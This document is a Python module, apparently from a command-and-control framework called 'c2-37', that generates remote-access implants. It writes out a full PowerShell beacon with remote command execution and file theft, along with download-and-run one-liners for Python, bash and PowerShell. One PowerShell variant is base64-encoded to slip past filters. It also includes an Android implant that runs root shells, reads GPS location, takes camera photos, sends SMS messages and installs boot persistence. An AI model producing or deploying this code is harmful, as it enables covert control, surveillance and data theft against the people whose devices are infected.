"""c2-37 payloads — multi-platform implant generator.

Generates implants for: Python (Linux/Mac), PowerShell (Windows),
Android (Termux-aware Python). All use only stdlib.
"""
from __future__ import annotations

import base64
import inspect
import os
import textwrap


def _get_implant_source() -> str:
    """Read the implant.py source code."""
    implant_path = os.path.join(os.path.dirname(__file__), "implant.py")
    with open(implant_path) as f:
        return f.read()


def python_implant(server_url: str, sleep: int = 5, jitter: int = 20) -> str:
    """Generate a standalone Python implant script."""
    source = _get_implant_source()
    # Replace defaults and add auto-run
    runner = f'''
# ── Auto-configured ──
if __name__ == "__main__":
    agent = Implant("{server_url}")
    agent.sleep = {sleep}
    agent.jitter = {jitter}
    agent.run()
'''
    # Strip the existing __main__ block and append our config
    lines = source.split("\n")
    cut = None
    for i, line in enumerate(lines):
        if 'if __name__ == "__main__"' in line:
            cut = i
            break
    if cut is not None:
        lines = lines[:cut]
    return "\n".join(lines) + "\n" + runner


def python_oneliner(server_url: str) -> str:
    """Generate a Python one-liner that fetches and executes the staged payload."""
    return f'python3 -c "import urllib.request;exec(urllib.request.urlopen(\'{server_url}/stage\').read())"'


def python_stager(server_url: str) -> str:
    """Generate a compact Python stager script."""
    return textwrap.dedent(f'''\
        #!/usr/bin/env python3
        import urllib.request, ssl
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            code = urllib.request.urlopen("{server_url}/stage", context=ctx).read()
        except Exception:
            code = urllib.request.urlopen("{server_url}/stage").read()
        exec(code)
    ''')


def powershell_implant(server_url: str, sleep: int = 5, jitter: int = 20) -> str:
    """Generate a PowerShell implant for Windows targets."""
    return textwrap.dedent(f'''\
        # c2-37 Windows Implant (PowerShell)
        # Usage: powershell -ep bypass -f implant.ps1
        # Or:   powershell -ep bypass -c "IEX(IWR '{server_url}/stage/ps')"

        $C2 = "{server_url}"
        $Sleep = {sleep}
        $Jitter = {jitter}
        $AgentID = [guid]::NewGuid().ToString().Substring(0,8)

        function Post-Json($Path, $Body) {{
            try {{
                $json = $Body | ConvertTo-Json -Depth 10
                $resp = Invoke-WebRequest -Uri "$C2$Path" -Method POST `
                    -Body $json -ContentType "application/json" `
                    -UseBasicParsing -TimeoutSec 10
                return ($resp.Content | ConvertFrom-Json)
            }} catch {{
                return $null
            }}
        }}

        function Get-SysInfo {{
            return @{{
                id       = $AgentID
                hostname = $env:COMPUTERNAME
                username = "$env:USERDOMAIN\\$env:USERNAME"
                os       = [System.Environment]::OSVersion.VersionString
            }}
        }}

        # Register
        $info = Get-SysInfo
        $reg = Post-Json "/register" $info
        if ($reg -and $reg.id) {{
            $AgentID = $reg.id
            if ($reg.sleep) {{ $Sleep = $reg.sleep }}
            if ($reg.jitter) {{ $Jitter = $reg.jitter }}
        }}

        # Main loop
        while ($true) {{
            try {{
                $resp = Post-Json "/beacon" @{{ id = $AgentID }}
                if ($resp -and $resp.commands) {{
                    foreach ($cmd in $resp.commands) {{
                        $result = @{{
                            cmd_id = $cmd.id
                            id     = $AgentID
                            type   = $cmd.type
                        }}

                        switch ($cmd.type) {{
                            "shell" {{
                                try {{
                                    $out = Invoke-Expression $cmd.args.cmd 2>&1 | Out-String
                                    $result["stdout"] = $out
                                    $result["returncode"] = 0
                                }} catch {{
                                    $result["stderr"] = $_.Exception.Message
                                    $result["returncode"] = 1
                                }}
                            }}
                            "download" {{
                                $bytes = [IO.File]::ReadAllBytes($cmd.args.path)
                                $result["data"] = [Convert]::ToBase64String($bytes)
                                $result["path"] = $cmd.args.path
                            }}
                            "upload" {{
                                $bytes = [Convert]::FromBase64String($cmd.args.data)
                                [IO.File]::WriteAllBytes($cmd.args.path, $bytes)
                                $result["path"] = $cmd.args.path
                                $result["size"] = $bytes.Length
                            }}
                            "sysinfo" {{
                                $si = Get-SysInfo
                                $result["hostname"] = $si.hostname
                                $result["username"] = $si.username
                                $result["os"] = $si.os
                                $result["pid"] = $PID
                                $result["cwd"] = (Get-Location).Path
                            }}
                            "sleep" {{
                                if ($cmd.args.sleep) {{ $Sleep = $cmd.args.sleep }}
                                if ($cmd.args.jitter) {{ $Jitter = $cmd.args.jitter }}
                                $result["sleep"] = $Sleep
                                $result["jitter"] = $Jitter
                            }}
                            "exit" {{
                                Post-Json "/result" $result
                                exit
                            }}
                        }}

                        Post-Json "/result" $result | Out-Null
                    }}
                }}
            }} catch {{}}

            # Jittered sleep
            $jitterRange = $Sleep * $Jitter / 100
            $actual = $Sleep + (Get-Random -Minimum (-$jitterRange) -Maximum $jitterRange)
            Start-Sleep -Seconds ([Math]::Max(0.5, $actual))
        }}
    ''')


def powershell_oneliner(server_url: str) -> str:
    """Generate a PowerShell one-liner for Windows."""
    return f'powershell -ep bypass -c "IEX(IWR \'{server_url}/stage/ps\' -UseBasicParsing)"'


def powershell_encoded(server_url: str) -> str:
    """Generate a base64-encoded PowerShell one-liner (bypasses some filters)."""
    cmd = f"IEX(Invoke-WebRequest '{server_url}/stage/ps' -UseBasicParsing)"
    encoded = base64.b64encode(cmd.encode("utf-16-le")).decode()
    return f'powershell -ep bypass -enc {encoded}'


def android_implant(server_url: str, sleep: int = 10, jitter: int = 30) -> str:
    """Generate an Android/Termux-aware Python implant.

    Extra capabilities:
    - Detects Termux vs rooted Android
    - Gathers Android-specific info (device model, Android version, etc.)
    - Can execute commands via su for rooted devices
    - Persistence via Termux:Boot if available
    """
    source = _get_implant_source()

    android_extras = textwrap.dedent(f'''\

        # ── Android/Termux Extensions ──────────────────────────

        class AndroidImplant(Implant):
            """Extended implant with Android-specific features."""

            def __init__(self, server_url: str, agent_id: str = None):
                super().__init__(server_url, agent_id)
                self.sleep = {sleep}
                self.jitter = {jitter}
                self.is_termux = os.path.exists("/data/data/com.termux")
                self.is_rooted = self._check_root()

            def _check_root(self) -> bool:
                """Check if device is rooted."""
                try:
                    result = subprocess.run(
                        ["su", "-c", "id"],
                        capture_output=True, text=True, timeout=3
                    )
                    return "uid=0" in result.stdout
                except Exception:
                    return False

            def _system_info(self) -> dict:
                info = super()._system_info()
                info["platform"] = "android"
                info["is_rooted"] = self.is_rooted
                info["is_termux"] = self.is_termux

                # Android-specific info
                try:
                    model = subprocess.run(
                        ["getprop", "ro.product.model"],
                        capture_output=True, text=True, timeout=3
                    ).stdout.strip()
                    android_ver = subprocess.run(
                        ["getprop", "ro.build.version.release"],
                        capture_output=True, text=True, timeout=3
                    ).stdout.strip()
                    info["device_model"] = model
                    info["android_version"] = android_ver
                except Exception:
                    pass

                # Termux-specific
                if self.is_termux:
                    info["termux_home"] = os.environ.get("HOME", "")
                    info["termux_prefix"] = os.environ.get("PREFIX", "")

                return info

            def execute(self, cmd: dict) -> dict:
                """Execute with Android-specific command types."""
                cmd_type = cmd.get("type", "")
                args = cmd.get("args", {{}})

                # Root shell — execute via su
                if cmd_type == "rootshell" and self.is_rooted:
                    result = {{"cmd_id": cmd.get("id"), "id": self.id, "type": cmd_type}}
                    try:
                        proc = subprocess.run(
                            ["su", "-c", args.get("cmd", "")],
                            capture_output=True, text=True,
                            timeout=args.get("timeout", 30)
                        )
                        result["stdout"] = proc.stdout
                        result["stderr"] = proc.stderr
                        result["returncode"] = proc.returncode
                    except Exception as e:
                        result["error"] = str(e)
                    return result

                # Toast notification (Termux:API)
                elif cmd_type == "toast" and self.is_termux:
                    result = {{"cmd_id": cmd.get("id"), "id": self.id, "type": cmd_type}}
                    try:
                        subprocess.run(
                            ["termux-toast", args.get("text", "c2-37")],
                            timeout=5
                        )
                        result["status"] = "sent"
                    except Exception as e:
                        result["error"] = str(e)
                    return result

                # Location (Termux:API)
                elif cmd_type == "location" and self.is_termux:
                    result = {{"cmd_id": cmd.get("id"), "id": self.id, "type": cmd_type}}
                    try:
                        proc = subprocess.run(
                            ["termux-location", "-p", "gps", "-r", "once"],
                            capture_output=True, text=True, timeout=30
                        )
                        result["location"] = json.loads(proc.stdout) if proc.stdout else {{}}
                    except Exception as e:
                        result["error"] = str(e)
                    return result

                # Camera capture (Termux:API)
                elif cmd_type == "camera" and self.is_termux:
                    result = {{"cmd_id": cmd.get("id"), "id": self.id, "type": cmd_type}}
                    try:
                        import tempfile
                        path = tempfile.mktemp(suffix=".jpg")
                        cam_id = args.get("camera", "0")
                        subprocess.run(
                            ["termux-camera-photo", "-c", cam_id, path],
                            timeout=10
                        )
                        if os.path.exists(path):
                            with open(path, "rb") as f:
                                result["data"] = base64.b64encode(f.read()).decode()
                            os.unlink(path)
                            result["status"] = "captured"
                        else:
                            result["error"] = "capture failed"
                    except Exception as e:
                        result["error"] = str(e)
                    return result

                # SMS send (Termux:API, rooted or Termux:API)
                elif cmd_type == "sms" and self.is_termux:
                    result = {{"cmd_id": cmd.get("id"), "id": self.id, "type": cmd_type}}
                    try:
                        subprocess.run(
                            ["termux-sms-send", "-n", args.get("number", ""), args.get("text", "")],
                            timeout=10
                        )
                        result["status"] = "sent"
                    except Exception as e:
                        result["error"] = str(e)
                    return result

                # Fall through to parent
                return super().execute(cmd)

            def install_persistence(self):
                """Install Termux:Boot persistence if available."""
                boot_dir = os.path.expanduser("~/.termux/boot")
                if not os.path.exists(boot_dir):
                    os.makedirs(boot_dir, exist_ok=True)
                script_path = os.path.join(boot_dir, "c2-agent.sh")
                me = os.path.abspath(__file__)
                with open(script_path, "w") as f:
                    f.write(f"#!/data/data/com.termux/files/usr/bin/bash\\n")
                    f.write(f"nohup python3 {{me}} &\\n")
                os.chmod(script_path, 0o755)


        if __name__ == "__main__":
            import sys
            url = sys.argv[1] if len(sys.argv) > 1 else "{server_url}"
            agent = AndroidImplant(url)
            if "--persist" in sys.argv:
                agent.install_persistence()
            agent.run()
    ''')

    # Strip existing __main__ block
    lines = source.split("\n")
    cut = None
    for i, line in enumerate(lines):
        if 'if __name__ == "__main__"' in line:
            cut = i
            break
    if cut is not None:
        lines = lines[:cut]

    # Add base64 import if not present
    base_source = "\n".join(lines)
    if "import base64" not in base_source:
        base_source = base_source.replace("import json", "import base64\nimport json")

    return base_source + "\n" + android_extras


def bash_oneliner(server_url: str) -> str:
    """Generate a bash reverse shell one-liner that downloads and runs the Python implant."""
    return f'curl -s {server_url}/stage | python3 -'


def generate_all(server_url: str, sleep: int = 5, jitter: int = 20) -> dict:
    """Generate all payload formats. Returns dict of format -> code."""
    return {
        "python": python_implant(server_url, sleep, jitter),
        "python_oneliner": python_oneliner(server_url),
        "python_stager": python_stager(server_url),
        "powershell": powershell_implant(server_url, sleep, jitter),
        "powershell_oneliner": powershell_oneliner(server_url),
        "powershell_encoded": powershell_encoded(server_url),
        "android": android_implant(server_url, sleep * 2, jitter + 10),
        "bash_oneliner": bash_oneliner(server_url),
    }
